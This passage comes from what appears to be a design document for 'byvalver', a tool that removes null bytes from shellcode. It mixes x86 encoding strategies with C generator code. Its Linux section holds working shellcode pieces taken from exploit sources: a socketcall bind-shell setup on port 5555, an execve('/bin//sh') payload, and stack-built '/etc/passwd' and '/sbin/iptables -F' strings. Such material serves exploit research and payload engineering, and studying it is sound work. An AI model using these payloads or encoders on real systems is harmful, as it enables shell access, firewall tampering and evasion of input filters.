            buffer_append_dword_le(b, (uint32_t)val2);
        }
    }
}
```

**Step 3: Memory Operand Optimization**
```nasm
; Original (potential nulls):
mov dword [edi], 0x20002    ; AF_INET=2, port=0x8000 (reversed)

; Decomposition:
xor eax, eax                ; EAX = 0
add eax, 0x20002            ; EAX = 0x20002 (if 0x20002 has nulls, decompose further)
mov [edi], eax              ; Store

; Or direct memory operation:
mov dword [edi], 0x11111    ; Null-free base
add dword [edi], 0xEEF1     ; Adjust: 0x11111 + 0xEEF1 = 0x20002
```

### Advantages
- **Flexible value construction**: Can encode any 32-bit value
- **Null-byte elimination**: Always finds null-free decomposition
- **In-place modification**: Can operate directly on memory
- **Multiple strategies**: ADD, SUB, XOR, OR combinations

### Considerations
- **Code size**: Decomposition increases instruction count (6-10 bytes vs. 5-6 bytes)
- **Search space**: Finding optimal decomposition can be slow (use caching)
- **Flag effects**: Arithmetic operations modify flags
- **Memory access**: Direct memory operations may be slower than register operations

### Advanced Decomposition Strategies

**Strategy A: Two-Step Addition**
```nasm
; Target: 0x12345678
mov eax, 0x12340000         ; Null-free high part
add eax, 0x5678             ; Null-free low part
```

**Strategy B: XOR-Based**
```nasm
; Target: 0xAAAAAAAA
mov eax, 0xFFFFFFFF         ; All bits set
xor eax, 0x55555555         ; Toggle bits
```

**Strategy C: Shift-Based**
```nasm
; Target: 0x12000000
mov eax, 0x12               ; Low byte
shl eax, 24                 ; Shift to high byte
```

**Strategy D: Negative Value**
```nasm
; Target: 0x00000100
mov eax, 0xFFFFFF00         ; -256
neg eax                     ; Negate: EAX = 0x100
```

### Implementation in byvalver
```c
typedef struct {
    enum { ARITH_ADD, ARITH_SUB, ARITH_XOR, ARITH_SHL, ARITH_NEG } type;
    int64_t val1;
    int64_t val2;
    size_t size;  // Instruction size for this strategy
} arithmetic_strategy_t;

arithmetic_strategy_t find_best_strategy(int64_t target) {
    arithmetic_strategy_t strategies[10];
    size_t count = 0;

    // Try all strategies
    if (try_add_decomposition(target, &strategies[count])) count++;
    if (try_sub_decomposition(target, &strategies[count])) count++;
    if (try_xor_decomposition(target, &strategies[count])) count++;
    if (try_shift_decomposition(target, &strategies[count])) count++;
    if (try_neg_decomposition(target, &strategies[count])) count++;

    // Return smallest strategy
    arithmetic_strategy_t best = strategies[0];
    for (size_t i = 1; i < count; i++) {
        if (strategies[i].size < best.size) {
            best = strategies[i];
        }
    }

    return best;
}
```

### Test Case
```nasm
; Original:
mov eax, 0x20002            ; B8 02 00 02 00 (has nulls)

; Strategy A: Addition
mov eax, 0x10001            ; B8 01 00 01 00 (still has nulls)
add eax, 0x10001            ; 05 01 00 01 00 (still has nulls)

; Strategy B: Better decomposition
mov eax, 0x11111            ; B8 11 11 01 00 (has 1 null)
add eax, 0xEEF1             ; 05 F1 EE 00 00 (has nulls)

; Strategy C: Negative approach
mov eax, 0xFFFDFFFE         ; Negative of target
neg eax                     ; F7 D8 (EAX = 0x20002)
```

---

## LINUX STRATEGIES

---

## [Linux] Socketcall Multiplexer Pattern
**Source**: 13309.asm, 13317.s, 13318.s
**Technique Category**: System Call, Multiplexer Usage
**Priority**: HIGH (Linux networking shellcode foundation)

### Description
Linux x86 uses a multiplexer system call for all socket operations:
```nasm
; From 13309.asm:
mov $0x66, %al          ; socketcall() syscall number
incb %bl                ; BL = socket operation type (1=socket, 2=bind, etc.)
mov %esp, %ecx          ; ECX = pointer to arguments on stack
int $0x80               ; Execute syscall
```

**Socket operation types:**
```
1 = SYS_SOCKET
2 = SYS_BIND
3 = SYS_CONNECT
4 = SYS_LISTEN
5 = SYS_ACCEPT
```

The pattern uses INCB to increment the operation type, avoiding immediate values:
```nasm
xor %ebx, %ebx          ; EBX = 0
mov $0x66, %al          ; socketcall
incb %bl                ; EBX = 1 (SYS_SOCKET)
int $0x80

mov $0x66, %al          ; socketcall
incb %bl                ; EBX = 2 (SYS_BIND)
int $0x80

incb %bl                ; EBX = 3 (skip to SYS_LISTEN, no call to CONNECT)
mov $0x66, %al          ; socketcall
incb %bl                ; EBX = 4 (SYS_LISTEN)
int $0x80
```

### Implementation Approach

**Step 1: Recognize Socketcall Pattern**
```c
int is_linux_socketcall(cs_insn *insn) {
    // Pattern: MOV AL, 0x66 + INT 0x80
    if (insn->id == X86_INS_INT &&
        insn->detail->x86.operands[0].imm == 0x80) {

        // Check previous instruction
        cs_insn *prev = get_previous_instruction(insn);
        if (prev && prev->id == X86_INS_MOV &&
            prev->detail->x86.operands[0].reg == X86_REG_AL &&
            prev->detail->x86.operands[1].imm == 0x66) {
            return 1;
        }
    }

    return 0;
}
```

**Step 2: Generate Socketcall Sequence**
```c
void generate_socketcall(struct buffer *b, uint8_t operation) {
    // MOV AL, 0x66
    buffer_append_byte(b, 0xB0);
    buffer_append_byte(b, 0x66);

    // MOV BL, operation (or use INC to reach operation)
    if (operation == 1) {
        buffer_append_byte(b, 0xFE);
        buffer_append_byte(b, 0xC3);  // INC BL
    } else {
        buffer_append_byte(b, 0xB3);
        buffer_append_byte(b, operation);
    }

    // MOV ECX, ESP (arguments pointer)
    buffer_append_byte(b, 0x89);
    buffer_append_byte(b, 0xE1);

    // INT 0x80
    buffer_append_byte(b, 0xCD);
    buffer_append_byte(b, 0x80);
}
```

**Step 3: Argument Setup**

Socket arguments are passed on the stack:
```nasm
; socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=6)
push $0x6               ; protocol
push $0x1               ; type
push $0x2               ; family
mov $0x66, %al          ; socketcall
incb %bl                ; SYS_SOCKET (1)
mov %esp, %ecx          ; ECX = pointer to args
int $0x80               ; EAX = socket fd

; bind(socket, &sockaddr, sizeof(sockaddr))
mov %eax, %edi          ; Save socket fd
xor %edx, %edx          ; EDX = 0
push %edx               ; sin_addr = 0.0.0.0
pushw $0xb315           ; sin_port = 5555 (htons)
pushw %bx               ; sin_family = AF_INET (2)
mov %esp, %ecx          ; ECX = &sockaddr
push $0x10              ; addrlen = 16
push %ecx               ; &sockaddr
push %edi               ; socket fd
mov $0x66, %al          ; socketcall
incb %bl                ; SYS_BIND (2)
mov %esp, %ecx          ; ECX = pointer to args
int $0x80
```

### Advantages
- **Compact**: Single syscall number (0x66) for all socket operations
- **Null-free**: Operation types 1-5 are null-free
- **Incremental**: INCB pattern avoids immediate values
- **Consistent**: Same pattern for socket, bind, listen, accept, connect

### Considerations
- **x86-specific**: Linux x86-64 uses separate syscalls (socket=41, bind=49, etc.)
- **Argument pointer**: Must point to valid stack memory
- **Operation order**: Must track current operation number in EBX
- **Return value**: EAX contains result (fd or error code)

### Implementation in byvalver
```c
void preserve_socketcall_pattern(cs_insn *insn, size_t count) {
    // Recognize and preserve the INCB pattern
    // Don't transform individual instructions if they're part of socketcall sequence

    if (is_socketcall_sequence(insn, count)) {
        // Copy instructions as-is
        for (size_t i = 0; i < count; i++) {
            buffer_append_bytes(b, insn[i].bytes, insn[i].size);
        }
    }
}
```

### Test Case
```nasm
; Complete socket creation:
xor %ebx, %ebx          ; EBX = 0
mov %ebx, %eax          ; EAX = 0

push $0x6               ; protocol
push $0x1               ; type
push $0x2               ; family
mov $0x66, %al          ; socketcall
incb %bl                ; EBX = 1 (SYS_SOCKET)
mov %esp, %ecx          ; ECX = &args
int $0x80               ; socket(2, 1, 6)
```

---

## [Linux] Push Immediate for Syscall Numbers
**Source**: 13317.s (lines 96-97), 13318.s (lines 93-94)
**Technique Category**: Register Loading, Immediate Optimization
**Priority**: MEDIUM

### Description
Instead of using MOV to load syscall numbers, shellcode uses PUSH+POP for compactness:

```nasm
; From 13317.s:
push    byte    0x05        ; PUSH 8-bit immediate
pop     eax                 ; POP to EAX
; EAX = 5 (open syscall)
```

**Comparison:**
```nasm
; PUSH+POP: 3 bytes
push byte 0x05              ; 6A 05
pop eax                     ; 58

; MOV: 5 bytes
mov eax, 0x05               ; B8 05 00 00 00 (has nulls!)

; MOV with byte register: 2 bytes
mov al, 0x05                ; B0 05 (but requires zero-extending)
```

### Implementation Approach

**Step 1: Detect MOV with Small Immediate**
```c
int can_use_push_pop_for_mov(cs_insn *insn) {
    if (insn->id != X86_INS_MOV) return 0;

    cs_x86 *x86 = &insn->detail->x86;
    if (x86->op_count != 2) return 0;

    // Check: MOV reg32, imm where imm fits in signed byte
    if (x86->operands[0].type == X86_OP_REG &&
        x86->operands[1].type == X86_OP_IMM) {

        int64_t imm = x86->operands[1].imm;

        if (imm >= -128 && imm <= 127) {
            return 1;
        }
    }

    return 0;
}
```

**Step 2: Generate PUSH+POP Sequence**
```c
void generate_push_pop_mov(struct buffer *b, uint8_t reg, int8_t value) {
    // PUSH imm8
    buffer_append_byte(b, 0x6A);
    buffer_append_byte(b, (uint8_t)value);

    // POP reg
    buffer_append_byte(b, 0x58 + get_register_index(reg));
}
```

**Step 3: Extended Pattern for Multiple Registers**
```nasm
; Load multiple values efficiently
push byte 11                ; syscall number (execve)
pop eax
cdq                         ; EDX = 0 (sign-extend EAX, but EAX is positive so EDX=0)
push edx                    ; Push 0
```

### Advantages
- **Compact**: 3 bytes vs. 5 bytes for MOV with 32-bit immediate
- **Null-free**: PUSH byte is always null-free (6A xx)
- **Sign-extension**: Automatically sign-extends to 32-bit
- **Stack cleanup**: POP removes value from stack

### Considerations
- **Stack modification**: Temporarily pushes value (requires valid stack)
- **Value range**: Only works for -128 to 127 (signed byte)
- **Register encoding**: POP uses different encoding for each register
- **Flag preservation**: Does not affect flags

### Implementation in byvalver
```c
void optimize_mov_small_immediate(struct buffer *b, cs_insn *insn) {
    uint8_t reg = insn->detail->x86.operands[0].reg;
    int64_t imm = insn->detail->x86.operands[1].imm;

    if (imm >= -128 && imm <= 127) {
        // Use PUSH+POP
        generate_push_pop_mov(b, reg, (int8_t)imm);
    } else {
        // Use alternative strategy
        generate_null_free_mov(b, reg, imm);
    }
}
```

### Test Case
```nasm
; Original:
mov eax, 11                 ; B8 0B 00 00 00 (has nulls)

; Optimized:
push byte 11                ; 6A 0B
pop eax                     ; 58
```

---

## [Linux] CDQ for Zero Extension
**Source**: 13317.s (line 98), 13318.s (line 95)
**Technique Category**: Register Zeroing, Sign Extension
**Priority**: HIGH

### Description
CDQ (Convert Dword to Qword) sign-extends EAX into EDX:EAX. When EAX contains a small positive value, CDQ zeros EDX:

```nasm
; From 13317.s:
push    byte 0x05           ; Push 5
pop     eax                 ; EAX = 5
cdq                         ; EDX = 0 (sign-extend positive value)
```

**CDQ Behavior:**
```
If EAX >= 0: EDX = 0x00000000
If EAX < 0:  EDX = 0xFFFFFFFF
```

**Comparison:**
```nasm
; CDQ: 1 byte
cdq                         ; 99

; XOR EDX, EDX: 2 bytes
xor edx, edx                ; 31 D2

; MOV EDX, 0: 5 bytes
mov edx, 0                  ; BA 00 00 00 00 (has nulls!)
```

### Implementation Approach

**Step 1: Detect Zeroing After Positive Value Load**
```c
int can_use_cdq_for_zero(cs_insn *prev_insn, cs_insn *insn) {
    // Check if we're zeroing EDX
    if (insn->id != X86_INS_XOR && insn->id != X86_INS_MOV) return 0;

    // Check if previous instruction loaded positive value into EAX
    if (prev_insn && prev_insn->id == X86_INS_POP &&
        prev_insn->detail->x86.operands[0].reg == X86_REG_EAX) {

        // Check even earlier for PUSH positive value
        cs_insn *push_insn = get_previous_instruction(prev_insn);
        if (push_insn && push_insn->id == X86_INS_PUSH) {
            int64_t value = push_insn->detail->x86.operands[0].imm;
            if (value >= 0 && value < 0x80000000) {
                return 1;
            }
        }
    }

    return 0;
}
```

**Step 2: Generate CDQ**
```c
void generate_cdq(struct buffer *b) {
    // CDQ: 99
    buffer_append_byte(b, 0x99);
}
```

**Step 3: Common Pattern in Linux Shellcode**
```nasm
; execve("/bin/sh", NULL, NULL)
push byte 11                ; EAX = 11 (execve syscall)
pop eax
cdq                         ; EDX = 0 (envp = NULL)
push edx                    ; Push NULL
push 0x68732f2f             ; "//sh"
push 0x6e69622f             ; "/bin"
mov ebx, esp                ; EBX = "/bin//sh"
push edx                    ; Push NULL (argv[1])
push ebx                    ; Push "/bin//sh" (argv[0])
mov ecx, esp                ; ECX = argv
int 0x80                    ; execve("/bin//sh", argv, NULL)
```

### Advantages
- **Ultra-compact**: 1 byte vs. 2 bytes for XOR
- **Null-free**: Opcode 0x99 contains no nulls
- **Multi-purpose**: Zeros EDX while EAX remains intact
- **Fast**: Single-cycle operation on modern CPUs

### Considerations
- **EAX dependency**: Requires EAX to contain positive value
- **Sign extension**: If EAX is negative, EDX becomes 0xFFFFFFFF (not zero)
- **Register coupling**: Links EDX value to EAX value
- **Limited use**: Only beneficial when EAX is already set correctly

### Implementation in byvalver
```c
void optimize_edx_zeroing(struct buffer *b, cs_insn *insn, cs_insn *prev_insn) {
    // Check if EAX contains positive value
    if (is_eax_positive(prev_insn)) {
        // Use CDQ
        buffer_append_byte(b, 0x99);
    } else {
        // Use XOR EDX, EDX
        buffer_append_byte(b, 0x31);
        buffer_append_byte(b, 0xD2);
    }
}
```

### Extended Usage: Combine with PUSH for NULL Pointers
```nasm
; Create NULL pointer efficiently
push byte 11                ; Load syscall number
pop eax
cdq                         ; EDX = 0
push edx                    ; Push NULL onto stack
; ESP now points to NULL dword
```

### Test Case
```nasm
; Original:
xor edx, edx                ; 31 D2 (2 bytes)

; Optimized:
cdq                         ; 99 (1 byte, if EAX > 0)
```

---

## [Linux] String Construction via PUSH
**Source**: 13317.s (lines 103-106), 13318.s (lines 113-120)
**Technique Category**: Data Embedding, String Construction
**Priority**: HIGH

### Description
Linux shellcode constructs strings on the stack using PUSH instructions:

```nasm
; From 13317.s (iptables path):
push    edx                 ; Push 0 (null terminator)
push    word 0x462d         ; Push "-F" (reversed)
mov     ecx, esp            ; ECX = pointer to "-F\0"

push    edx                 ; Push 0 (null terminator)
push    word 0x7365         ; "es"
push    0x6c626174          ; "tabl"
push    0x70692f6e          ; "n/ip"
push    0x6962732f          ; "/sbi"
mov     ebx, esp            ; EBX = "/sbin/iptables\0"
```

**Byte order:** x86 is little-endian, so strings are reversed:
```
"tabl" (ASCII) = 0x74 61 62 6C → stored as 6C 62 61 74
```

### Implementation Approach

**Step 1: String-to-Stack Converter**
```c
void generate_linux_push_string(struct buffer *b, const char *str) {
    size_t len = strlen(str);

    // Align to 4-byte boundary
    size_t padded_len = (len + 4) & ~3;
    char *padded = calloc(padded_len, 1);
    strcpy(padded, str);

    // Push null terminator first (will be at end of string in memory)
    buffer_append_byte(b, 0x31);  // XOR EDX, EDX
    buffer_append_byte(b, 0xD2);
    buffer_append_byte(b, 0x52);  // PUSH EDX

    // Push dwords in reverse order
    for (int i = len - 1; i >= 0; i -= 4) {
        int start = (i < 3) ? 0 : i - 3;
        int size = i - start + 1;

        uint32_t dword = 0;
        for (int j = 0; j < size; j++) {
            dword |= ((uint32_t)padded[start + j]) << (j * 8);
        }

        // PUSH dword
        buffer_append_byte(b, 0x68);
        buffer_append_dword_le(b, dword);
    }

    free(padded);
}
```

**Step 2: Handling WORD vs. DWORD**
```c
void generate_optimized_push_string(struct buffer *b, const char *str) {
    // For short strings (2 bytes), use PUSHW
    if (strlen(str) <= 2) {
        uint16_t word = 0;
        for (int i = 0; i < strlen(str); i++) {
            word |= ((uint16_t)str[i]) << (i * 8);
        }

        // PUSHW
        buffer_append_byte(b, 0x66);  // Operand size prefix
        buffer_append_byte(b, 0x68);  // PUSH imm16
        buffer_append_word_le(b, word);
    } else {
        generate_linux_push_string(b, str);
    }
}
```

**Step 3: Common Linux Paths**
```nasm
; /bin/sh
xor ecx, ecx
push ecx                    ; Null terminator
push 0x68732f2f             ; "//sh"
push 0x6e69622f             ; "/bin"
mov ebx, esp                ; EBX = "/bin//sh"

; /etc/passwd
push edx                    ; Null terminator
push 0x64777373             ; "sswd"
push 0x61702f2f             ; "//pa"
push 0x6374652f             ; "/etc"
mov ebx, esp                ; EBX = "/etc//passwd"
```

### Advantages
- **Position-independent**: No data section needed
- **Null-free**: String contents are carefully chosen (no nulls in path)
- **Compact**: 5 bytes per 4 characters
- **Flexible**: Can construct any string at runtime

### Considerations
- **String content**: Must not contain null bytes (0x00) in the path itself
- **Byte order**: Little-endian reversal required
- **Stack space**: Each string consumes stack space
- **Alignment**: Paths should be aligned to 4-byte boundaries for efficiency

### Implementation in byvalver
```c
void preserve_linux_string_push(cs_insn *insn, size_t count) {
    // Recognize pattern: multiple PUSHes followed by MOV reg, ESP
    if (is_linux_string_construction(insn, count)) {
        // Don't transform individual PUSHes; preserve as sequence
        for (size_t i = 0; i < count; i++) {
            buffer_append_bytes(b, insn[i].bytes, insn[i].size);
        }
    }
}
```

### Test Case
```c
// Generate "/bin/sh" on stack
void test_bin_sh(void) {
    struct buffer b = {0};

    // XOR ECX, ECX
    buffer_append_byte(&b, 0x31);
    buffer_append_byte(&b, 0xC9);

    // PUSH ECX (null terminator)
    buffer_append_byte(&b, 0x51);

    // PUSH 0x68732f2f ("//sh")
    buffer_append_byte(&b, 0x68);
    buffer_append_dword_le(&b, 0x68732f2f);

    // PUSH 0x6e69622f ("/bin")
    buffer_append_byte(&b, 0x68);
    buffer_append_dword_le(&b, 0x6e69622f);

    // MOV EBX, ESP
    buffer_append_byte(&b, 0x89);
    buffer_append_byte(&b, 0xE3);
}
```

---

## Summary and Recommendations

### Critical Strategies for Immediate Implementation

**High Priority (Fixes Most Failing Binaries):**

1. **Multi-Byte NOP Null-Byte Elimination** - Affects 100% of compiler-generated binaries
2. **RIP-Relative Addressing Null-Byte Elimination** - Critical for x64 support
3. **Small Immediate Value Encoding** - Handles 0x100, 0x200, etc.
4. **Relative CALL/JMP Displacement Handling** - Essential for control flow

**Medium Priority (Improves Coverage):**

5. **Large Immediate Value MOV Optimization** - Common in initialization code
6. **REP STOSB for Memory Zeroing** - Compact memory operations
7. **ROR13/ROL5 Hash Recognition** - Preserve API resolution patterns
8. **SALC for Zero Register** - x86-32 specific optimization

**Linux-Specific:**

9. **Socketcall Multiplexer Pattern** - Foundation for network shellcode
10. **CDQ for Zero Extension** - Ultra-compact register zeroing
11. **Push Immediate for Syscall Numbers** - Common syscall pattern
12. **String Construction via PUSH** - Position-independent strings

### Implementation Roadmap for byvalver

**Phase 1: Critical Null-Byte Patterns** (Immediate)
- Implement multi-byte NOP detection and replacement
- Implement RIP-relative addressing null-byte handling
- Implement small immediate value optimizations (MOV CH, 0x3 pattern)

**Phase 2: Control Flow** (High Priority)
- Implement relative call/jump displacement null-byte elimination
- Add trampoline jump chain strategy for long conditional jumps
- Implement indirect jump via register strategy

**Phase 3: Immediate Value Construction** (Medium Priority)
- Enhance arithmetic decomposition algorithms
- Add shift-based immediate construction
- Implement negative value strategy (NEG instruction)

**Phase 4: Pattern Recognition** (Preservation)
- Recognize and preserve hash loop patterns (ROR13, ROL5)
- Recognize and preserve socketcall sequences (Linux)
- Recognize and preserve string construction patterns

**Phase 5: Advanced Optimizations** (Low Priority)
- XCHG for register preservation
- SCASD/LODSD for pointer arithmetic
- SALC for register zeroing (x86-32)
- REP STOSB for memory operations

### Expected Impact

Based on the failing binaries analysis:

**EHS.bin, ouroboros_core.bin:**
- Multi-byte NOP elimination: 80% of null bytes
- RIP-relative addressing: 15% of null bytes
- Small immediate values: 5% of null bytes
- **Expected result:** CLEAN

**cutyourmeat-static.bin:**
- Multi-byte NOP elimination: 60% of null bytes
- RIP-relative addressing: 30% of null bytes
- Large immediate values: 10% of null bytes
- **Expected result:** CLEAN

**cheapsuit.bin:**
- RIP-relative addressing: 40% of null bytes
- Relative call/jump displacements: 35% of null bytes
- Multi-byte NOPs: 15% of null bytes
- Immediate values: 10% of null bytes
- **Expected result:** SIGNIFICANT REDUCTION (likely clean)

### Testing Strategy

1. Implement each strategy in isolation
2. Create minimal test cases for each pattern
3. Verify null-byte elimination with `verify_nulls.py`
4. Verify functionality preservation with `verify_functionality.py`
5. Test on failing binaries progressively
6. Measure success rate improvement after each strategy

### Code Quality Standards

- Each strategy must be self-contained in its own module
- Priority values must be carefully chosen (higher for more specific patterns)
- All strategies must pass verification tests
- Size calculation must be exact (critical for offset calculation)
- Generated code must be semantically equivalent to original

---

**End of NEW_STRATEGIES.md**
